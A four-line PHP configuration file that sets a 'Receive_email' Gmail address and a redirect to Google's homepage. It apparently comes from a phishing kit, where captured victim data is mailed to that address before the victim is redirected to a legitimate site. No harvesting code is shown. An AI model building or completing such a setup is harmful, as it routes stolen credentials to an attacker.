<?php 
$Receive_email="mountalex56@gmail.com
";
$redirect="https://www.google.com/";
?>